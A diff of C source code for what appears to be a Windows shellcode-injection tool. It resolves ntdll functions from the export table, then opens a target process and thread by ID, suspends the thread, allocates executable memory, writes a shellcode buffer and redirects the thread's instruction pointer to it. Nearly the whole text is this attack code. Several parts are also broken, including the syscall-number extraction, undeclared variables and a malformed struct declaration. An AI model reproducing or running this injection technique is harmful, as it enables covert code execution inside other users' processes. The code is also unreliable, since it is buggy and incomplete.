@@ -1,5 +1,6 @@
 #include <stdio.h>
 #include "syscall.h"
+#include "main.h"
 
 
 #pragma comment(lib, "shlwapi.lib")
@@ -9,6 +10,13 @@
 #define STATUS_SUCCESS 0x00000000
 #define TH32CS_SNAPPROCESS 0x00000002
 #define TH32CS_SNAPTHREAD
+
+
+struct Rebis {
+	size_t ptr;
+	DWORD ssn;
+
+};
 
 // CREATE_NO_WINDOW already defined in winbase.h
 
@@ -109,7 +117,10 @@ size_t GetModHandle(wchar_t* ln) {
 
 }
 
-size_t GetFuncAddr(size_t modb, char* fn) {
+struct Rebis GetFuncAddr(size_t modb, char* fn) {
+
+
+	struct Rebis r;
 
 	PIMAGE_DOS_HEADER dosHdr = (PIMAGE_DOS_HEADER)(modb);
 	PIMAGE_NT_HEADERS ntHdr = (PIMAGE_NT_HEADERS)(modb + dosHdr->e_lfanew);
@@ -132,21 +143,135 @@ size_t GetFuncAddr(size_t modb, char* fn) {
 			g("Found function %s at ordinal index %d", name, ordinalIndex);
 			size_t funcAddr = modb + arrf[ordinalIndex];
 			g("Function address: 0x%p", funcAddr);
-			return funcAddr;
+
+			DWORD ssn;
+
+			unsigned char* funcbytes = (unsigned char*)&funcAddr;
+
+
+			for (size_t i = 0; i < sizeof(funcbytes); ++i) {
+
+				if (funcbytes[i] == 0xB8) {
+
+					g("Found eax instruction at byte %zu", i);
+
+					ssn = funcbytes[i + 1] + funcbytes[i + 2] + funcbytes[i + 3] + funcbytes[i + 4];
+
+					break;
+				}
+			}
+
+			r.ssn = ssn;
+			r.ptr = funcAddr;
+			return r;
+
 		}
 
 	}
 
-
-	return 0;
-
-
 }
 
-int main(){
+
+	int main(int argc, char* argv[]) {
+
+		if (argc < 3) {
+			e("Usage: %s <pid> <tid>", argv[0]);
+			return 1;
+		}
+
+		int pid = atoi(argv[1]);
+		int tid = atoi(argv[2]);
+		DWORD procid = (DWORD)pid;
+		DWORD threadid = (DWORD)tid;
+
+		size_t kb = GetModHandle(L"C:\\WINDOWS\\System32\\ntdll.dll");
+
+		struct Rebis stNtOpenThread = (struct Rebis)GetFuncAddr(kb, "NtOpenThread");
+		struct Rebis wrdNtOpenProcess = (struct Rebis)GetFuncAddr(kb, "NtOpenProcess");
+		struct Rebis wrdNtSuspendThread = (struct Rebis)GetFuncAddr(kb, "NtSuspendThread");
+		struct Rebis wrdNtGetContextThread = (struct Rebis)GetFuncAddr(kb, "NtGetContextThread");
+		struct Rebis wrdNtAllocateVirtualMemory = (struct Rebis)GetFuncAddr(kb, "NtAllocateVirtualMemory");
+		struct Rebis wrdNtWriteVirtualMemory = (struct Rebis)GetFuncAddr(kb, "NtWriteVirtualMemory");
+		struct Rebis wrdNtSetContextThread = (struct Rebis)GetFuncAddr(kb, "NtSetContextThread");
+		struct RebiswrdNtResumeThread = (struct Rebis)GetFuncAddr(kb, "NtResumeThread");
+
+		wrdNtOpenThread = stNtOpenThread.ssn;
+		
 
 
-}
+		NTSTATUS status;
+
+		STARTUPINFOW si = { .cb = sizeof(STARTUPINFOW) };
+		CLIENT_ID cid_proc = { (HANDLE)(ULONG_PTR)procid, NULL };
+		CLIENT_ID cid_thread = { (HANDLE)(ULONG_PTR)procid, (HANDLE)(ULONG_PTR)threadid };
+		i("target pid: %d, tid: %d", procid, threadid);
+		i("pid read in: %d", cid_proc.UniqueProcess);
+
+		OBJECT_ATTRIBUTES oa;
+		InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);
+
+		PVOID baseAddress = NULL;
+		PROCESS_INFORMATION pi;
+		CONTEXT CTX = { .ContextFlags = (CONTEXT_CONTROL | CONTEXT_SEGMENTS | CONTEXT_INTEGER) };
+
+		SIZE_T sz = sizeof(buf);
+		g("size of shellcode: %d", sz);
+
+		HANDLE hProc;
+		HANDLE hThread;
+
+		i("NtOpenProcess IS: 0x%x", wrdNtOpenProcess);
+		i("passing in:\n - handle:0x%x\n - mask: 0x%x\n - object attributes: 0x%p\n - cid: 0x%p\n", &hProc, PROCESS_ALL_ACCESS, &oa, &cid_proc);
+
+		status = ((NTSTATUS(NTAPI*)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PCLIENT_ID))ptr_NtOpenProcess)(&hProc, PROCESS_ALL_ACCESS, &oa, &cid_proc);
+
+		if (status == STATUS_SUCCESS) { g("proc opened"); }
+		else { e("proc not open, 0x%08X", status); return 1; }
+
+
+		status = ((NTSTATUS(NTAPI*)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PCLIENT_ID))ptr_NtOpenThread)(&hThread, THREAD_ALL_ACCESS, &oa, &cid_thread);
+
+		if (status == STATUS_SUCCESS) { g("thread opened"); }
+		else { e("thread not open, 0x%08X", status); return 1; }
+
+		status = ((NTSTATUS(NTAPI*)(HANDLE, PULONG))ptr_NtSuspendThread)(hThread, NULL);
+
+		if (status == STATUS_SUCCESS) { g("thread suspended"); }
+		else { e("thread not sus, 0x%08X", status); return 1; }
+
+		status = ((NTSTATUS(NTAPI*)(HANDLE, PCONTEXT))ptr_NtGetContextThread)(hThread, &CTX);
+
+		if (status == STATUS_SUCCESS) { g("got ctx thread at: %p", CTX); }
+		else { e("did not get ctx thread, 0x%08X", status); return 1; }
+
+		status = ((NTSTATUS(NTAPI*)(HANDLE, PVOID, ULONG_PTR, PSIZE_T, ULONG, ULONG))ptr_NtAllocateVirtualMemory)(hProc, &baseAddress, 0, &sz, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+
+		if (status == STATUS_SUCCESS) { g("allocated memory at: %p", baseAddress); }
+		else { e("failed to allocate memory, 0x%08X", status); return 1; }
+
+
+		status = ((NTSTATUS(NTAPI*)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T))ptr_NtWriteVirtualMemory)(hProc, baseAddress, buf, sizeof(buf), NULL);
+		if (status == STATUS_SUCCESS) {
+			g("wrote memory at: %p", baseAddress);
+		}
+		else { e("did not write, %08X", status); return 1; }
+
+		CTX.Rip = (DWORD64)baseAddress;
+
+		status = ((NTSTATUS(NTAPI*)(HANDLE, PCONTEXT))ptr_NtSetContextThread)(hThread, &CTX);
+		if (status == STATUS_SUCCESS) { g("set thread ctxy"); }
+		else { e("did not set , 0x%08X", status); return 1; }
+
+		status = ((NTSTATUS(NTAPI*)(HANDLE, PULONG))ptr_NtResumeThread)(hThread, NULL);
+
+		if (status == STATUS_SUCCESS) { g("resumed"); }
+		else { e("did not resume, 0x%08X", status); return 1; }
+
+
+		return 0;
+
+	}
+
 
 
 
